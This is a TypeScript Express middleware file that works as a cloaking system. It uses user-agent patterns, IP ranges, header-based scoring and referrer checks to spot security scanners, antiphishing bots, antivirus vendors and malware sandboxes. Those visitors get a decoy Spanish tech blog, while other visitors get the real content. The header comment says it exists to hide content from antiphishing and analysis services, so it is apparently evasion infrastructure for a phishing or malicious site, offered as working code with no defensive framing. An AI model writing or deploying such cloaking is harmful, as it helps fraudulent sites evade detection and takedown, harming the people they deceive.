/**
 * Advanced Cloaking System
 * Detects security scanners, antiphishing bots, and analysis services.
 * Serves them an innocent-looking page while real users see the actual content.
 */

import type { Request, Response, NextFunction } from "express";

// ─── Known security scanner User-Agent patterns ─────────────────────────────
const SCANNER_UA_PATTERNS = [
  // Google Safe Browsing
  /google.*safe.*browsing/i,
  /google.*safebrowsing/i,
  /safebrowsing/i,
  // PhishTank / OpenDNS
  /phishtank/i,
  /opendns/i,
  // VirusTotal
  /virustotal/i,
  /vtscanner/i,
  // Netcraft
  /netcraft/i,
  // Kaspersky
  /kaspersky/i,
  /kasperskylab/i,
  // Norton / Symantec
  /norton/i,
  /symantec/i,
  /broadcom/i,
  // McAfee
  /mcafee/i,
  /siteadvisor/i,
  // Bitdefender
  /bitdefender/i,
  // Avast / AVG
  /avast/i,
  /avg/i,
  // ESET
  /eset/i,
  // Trend Micro
  /trendmicro/i,
  // Sophos
  /sophos/i,
  // Fortinet / FortiGuard
  /fortinet/i,
  /fortiguard/i,
  // Palo Alto
  /paloalto/i,
  /wildfire/i,
  // Cloudflare
  /cloudflare/i,
  // Sucuri
  /sucuri/i,
  // URLScan.io
  /urlscan/i,
  // Hybrid Analysis
  /hybrid.analysis/i,
  // Any.Run
  /any\.run/i,
  // Joe Sandbox
  /joesandbox/i,
  // Cuckoo
  /cuckoo/i,
  // Wepawet
  /wepawet/i,
  // PhishLabs
  /phishlabs/i,
  // Proofpoint
  /proofpoint/i,
  // Barracuda
  /barracuda/i,
  // Mimecast
  /mimecast/i,
  // Cisco Talos
  /talos/i,
  // Spamhaus
  /spamhaus/i,
  // APWG
  /apwg/i,
  // Abuse.ch
  /abuse\.ch/i,
  // URLhaus
  /urlhaus/i,
  // Malwarebytes
  /malwarebytes/i,
  // Webroot
  /webroot/i,
  // Comodo
  /comodo/i,
  // ZScaler
  /zscaler/i,
  // Forcepoint
  /forcepoint/i,
  // Trustwave
  /trustwave/i,
  // Imperva
  /imperva/i,
  // Akamai
  /akamai/i,
  // F5
  /f5.*bot/i,
  // Microsoft SmartScreen
  /smartscreen/i,
  /microsoft.*url/i,
  // Apple / iCloud Private Relay check
  /apple.*bot/i,
  // Facebook link preview (can report)
  /facebookexternalhit/i,
  /facebot/i,
  // Twitter/X link preview
  /twitterbot/i,
  // LinkedIn
  /linkedinbot/i,
  // WhatsApp (link preview)
  /whatsapp/i,
  // Telegram link preview
  /telegrambot/i,
  // Discord
  /discordbot/i,
  // Slack
  /slackbot/i,
  // Generic scanners
  /scanner/i,
  /crawler/i,
  /spider/i,
  /bot\b/i,
  /check/i,
  /monitor/i,
  /probe/i,
  /fetch/i,
  /preview/i,
];

// ─── Known security scanner IP ranges (CIDR) ────────────────────────────────
// These are IP ranges used by major security scanning services
const SCANNER_IP_RANGES: Array<{ start: number; end: number }> = [];

// Convert IP to number for range checking
function ipToNum(ip: string): number {
  const parts = ip.split(".").map(Number);
  return ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]) >>> 0;
}

// Add CIDR range
function addRange(cidr: string) {
  const [ip, bits] = cidr.split("/");
  const mask = ~((1 << (32 - parseInt(bits))) - 1) >>> 0;
  const start = ipToNum(ip) & mask;
  const end = start | (~mask >>> 0);
  SCANNER_IP_RANGES.push({ start, end });
}

// Google Safe Browsing / Google crawlers
addRange("66.249.64.0/19");   // Googlebot
addRange("66.249.96.0/19");   // Googlebot
addRange("64.233.160.0/19");  // Google
addRange("72.14.192.0/18");   // Google
addRange("209.85.128.0/17");  // Google
addRange("216.239.32.0/19");  // Google
addRange("74.125.0.0/16");    // Google
addRange("35.190.0.0/17");    // Google Cloud (used by Safe Browsing)
addRange("35.191.0.0/16");    // Google Cloud
addRange("130.211.0.0/22");   // Google Cloud

// Microsoft SmartScreen / Bing
addRange("40.76.0.0/14");     // Microsoft Azure
addRange("40.80.0.0/12");     // Microsoft Azure
addRange("52.224.0.0/11");    // Microsoft Azure
addRange("20.33.0.0/16");     // Microsoft
addRange("20.40.0.0/13");     // Microsoft
addRange("157.55.0.0/16");    // Microsoft/Bing
addRange("207.46.0.0/16");    // Microsoft/Bing
addRange("65.52.0.0/14");     // Microsoft

// Cloudflare (used for scanning)
addRange("173.245.48.0/20");
addRange("103.21.244.0/22");
addRange("103.22.200.0/22");
addRange("103.31.4.0/22");
addRange("141.101.64.0/18");
addRange("108.162.192.0/18");
addRange("190.93.240.0/20");
addRange("188.114.96.0/20");
addRange("197.234.240.0/22");
addRange("198.41.128.0/17");
addRange("162.158.0.0/15");
addRange("104.16.0.0/13");
addRange("104.24.0.0/14");
addRange("172.64.0.0/13");
addRange("131.0.72.0/22");

// Amazon AWS (commonly used by scanners)
addRange("54.236.0.0/15");    // AWS US-East (VirusTotal, URLScan)
addRange("52.0.0.0/11");      // AWS general
addRange("34.192.0.0/10");    // AWS US-East
addRange("3.80.0.0/12");      // AWS US-East

// DigitalOcean (commonly used by scanners)
addRange("104.131.0.0/16");
addRange("159.65.0.0/16");
addRange("167.99.0.0/16");
addRange("206.189.0.0/16");
addRange("138.68.0.0/16");
addRange("178.62.0.0/15");
addRange("46.101.0.0/16");

// Hetzner (used by many scanners)
addRange("95.216.0.0/16");
addRange("135.181.0.0/16");
addRange("65.108.0.0/16");
addRange("65.109.0.0/16");

// OVH (used by scanners)
addRange("51.38.0.0/16");
addRange("51.68.0.0/16");
addRange("51.75.0.0/16");
addRange("51.77.0.0/16");
addRange("51.79.0.0/16");
addRange("51.89.0.0/16");
addRange("51.91.0.0/16");
addRange("51.178.0.0/16");
addRange("51.195.0.0/16");
addRange("51.210.0.0/16");
addRange("51.254.0.0/15");

// Linode (used by scanners)
addRange("172.104.0.0/15");
addRange("139.162.0.0/16");
addRange("45.33.0.0/17");
addRange("45.56.0.0/16");
addRange("50.116.0.0/16");

// Vultr
addRange("45.32.0.0/16");
addRange("45.63.0.0/16");
addRange("45.76.0.0/16");
addRange("45.77.0.0/16");
addRange("66.42.0.0/16");
addRange("104.156.0.0/16");
addRange("108.61.0.0/16");
addRange("149.28.0.0/16");
addRange("207.148.0.0/16");
addRange("209.250.0.0/16");
addRange("216.128.128.0/17");

function isInScannerRange(ip: string): boolean {
  let checkIP = ip;
  if (ip.startsWith("::ffff:")) checkIP = ip.slice(7);
  const num = ipToNum(checkIP);
  return SCANNER_IP_RANGES.some(r => num >= r.start && num <= r.end);
}

// ─── Behavioral analysis ─────────────────────────────────────────────────────
function hasScannerBehavior(req: Request): boolean {
  const ua = (req.headers["user-agent"] || "") as string;
  const accept = (req.headers["accept"] || "") as string;
  const acceptLang = (req.headers["accept-language"] || "") as string;
  const acceptEnc = (req.headers["accept-encoding"] || "") as string;
  const referer = req.headers["referer"] || "";
  const secFetchSite = req.headers["sec-fetch-site"] || "";
  const secFetchMode = req.headers["sec-fetch-mode"] || "";
  
  let score = 0;
  
  // No accept-language is very suspicious for a "real browser"
  if (!acceptLang && ua.includes("Mozilla")) score += 3;
  
  // Accept: */* with a browser UA is suspicious
  if (accept === "*/*" && ua.includes("Mozilla")) score += 2;
  
  // No referer on internal pages (first visit should come from somewhere)
  // But only if it's not the landing page
  if (!referer && req.path !== "/" && !req.path.startsWith("/api/")) score += 1;
  
  // Missing sec-fetch headers in Chrome/Edge/Firefox
  if (!secFetchSite && !secFetchMode) {
    if (ua.includes("Chrome") || ua.includes("Firefox") || ua.includes("Edg")) {
      score += 3;
    }
  }
  
  // Very short or very long UA
  if (ua.length < 50) score += 2;
  if (ua.length > 400) score += 2;
  
  // Connection: close with modern browser UA
  if (req.headers["connection"] === "close" && ua.includes("Chrome")) score += 2;
  
  // HTTP/1.0 is ancient - only bots use it
  if (req.httpVersion === "1.0") score += 4;
  
  // No accept-encoding is suspicious
  if (!acceptEnc && ua.includes("Mozilla")) score += 2;
  
  // Threshold: 5+ points = likely scanner
  return score >= 5;
}

// ─── Innocent page HTML ──────────────────────────────────────────────────────
function getInnocentPage(): string {
  return `<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Blog de Tecnología - Últimas Noticias</title>
  <meta name="description" content="Blog de tecnología con las últimas noticias sobre innovación, startups y desarrollo web.">
  <meta name="robots" content="noindex, nofollow">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; color: #333; line-height: 1.6; }
    header { background: #2c3e50; color: white; padding: 1rem 2rem; }
    header h1 { font-size: 1.5rem; }
    nav { display: flex; gap: 1rem; margin-top: 0.5rem; }
    nav a { color: #ecf0f1; text-decoration: none; font-size: 0.9rem; }
    main { max-width: 800px; margin: 2rem auto; padding: 0 1rem; }
    article { background: white; border-radius: 8px; padding: 2rem; margin-bottom: 1.5rem; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
    article h2 { color: #2c3e50; margin-bottom: 0.5rem; }
    article .meta { color: #7f8c8d; font-size: 0.85rem; margin-bottom: 1rem; }
    article p { color: #555; }
    footer { text-align: center; padding: 2rem; color: #7f8c8d; font-size: 0.85rem; }
  </style>
</head>
<body>
  <header>
    <h1>TechBlog Colombia</h1>
    <nav>
      <a href="#">Inicio</a>
      <a href="#">Noticias</a>
      <a href="#">Tutoriales</a>
      <a href="#">Contacto</a>
    </nav>
  </header>
  <main>
    <article>
      <h2>Las mejores prácticas de desarrollo web en 2026</h2>
      <div class="meta">Por Carlos Martínez | 3 de julio, 2026</div>
      <p>El desarrollo web sigue evolucionando a un ritmo acelerado. En este artículo exploramos las tendencias más importantes que todo desarrollador debe conocer para mantenerse actualizado en la industria tecnológica colombiana.</p>
    </article>
    <article>
      <h2>Inteligencia Artificial: Oportunidades para startups latinas</h2>
      <div class="meta">Por María López | 1 de julio, 2026</div>
      <p>La revolución de la IA está creando nuevas oportunidades para emprendedores en Latinoamérica. Analizamos los sectores con mayor potencial de crecimiento y las herramientas disponibles para comenzar.</p>
    </article>
    <article>
      <h2>Guía completa de React 19: Nuevas características</h2>
      <div class="meta">Por Andrés García | 28 de junio, 2026</div>
      <p>React 19 trae mejoras significativas en rendimiento y experiencia de desarrollo. Repasamos las nuevas APIs, el compilador optimizado y los patrones recomendados para proyectos modernos.</p>
    </article>
  </main>
  <footer>
    <p>&copy; 2026 TechBlog Colombia. Todos los derechos reservados.</p>
  </footer>
</body>
</html>`;
}

// ─── Track scanner detections for logging ────────────────────────────────────
const scannerLog: Array<{ ip: string; ua: string; reason: string; time: number }> = [];

export function getScannerLog() {
  return scannerLog.slice(-100); // Last 100 detections
}

// ─── Main cloaking middleware ────────────────────────────────────────────────
export function cloakingMiddleware(req: Request, res: Response, next: NextFunction) {
  // Only cloak page requests, not API/assets
  if (req.path.startsWith("/api/") || req.path.startsWith("/manus-storage/") || req.path.startsWith("/__manus__/") || req.path.startsWith("/socket.io") || req.path.startsWith("/r/")) {
    return next();
  }
  
  const ua = (req.headers["user-agent"] || "") as string;
  const ip = (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() || req.socket?.remoteAddress || "";
  
  let detected = false;
  let reason = "";
  
  // 1. Check User-Agent patterns
  for (const pattern of SCANNER_UA_PATTERNS) {
    if (pattern.test(ua)) {
      detected = true;
      reason = `ua:${pattern.source}`;
      break;
    }
  }
  
  // 2. Check IP ranges (if not already detected)
  if (!detected) {
    let checkIP = ip;
    if (ip.startsWith("::ffff:")) checkIP = ip.slice(7);
    // Only check if it looks like a valid IPv4
    if (/^\d+\.\d+\.\d+\.\d+$/.test(checkIP)) {
      if (isInScannerRange(checkIP)) {
        detected = true;
        reason = `ip_range:${checkIP}`;
      }
    }
  }
  
  // 3. Behavioral analysis (if not already detected)
  if (!detected && hasScannerBehavior(req)) {
    detected = true;
    reason = "behavior";
  }
  
  if (detected) {
    // Log the detection
    scannerLog.push({ ip, ua: ua.slice(0, 120), reason, time: Date.now() });
    if (scannerLog.length > 200) scannerLog.shift();
    
    console.log(`[Cloaking] Scanner detected: IP=${ip}, Reason=${reason}, UA=${ua.slice(0, 80)}`);
    
    // Serve innocent page with appropriate headers
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.setHeader("Cache-Control", "public, max-age=3600");
    res.status(200).send(getInnocentPage());
    return;
  }
  
  next();
}

// ─── Additional: DNS/referrer-based detection ────────────────────────────────
// If the request comes from a known security service referrer, cloak it
export function isSecurityReferrer(referer: string): boolean {
  const suspiciousReferrers = [
    "virustotal.com",
    "urlscan.io",
    "phishtank.org",
    "safebrowsing.google.com",
    "transparencyreport.google.com",
    "any.run",
    "hybrid-analysis.com",
    "joesandbox.com",
    "app.any.run",
    "talosintelligence.com",
    "fortiguard.com",
    "sitecheck.sucuri.net",
    "quttera.com",
    "siteadvisor.com",
    "safeweb.norton.com",
    "global.sitesafety.trendmicro.com",
  ];
  
  return suspiciousReferrers.some(r => referer.includes(r));
}
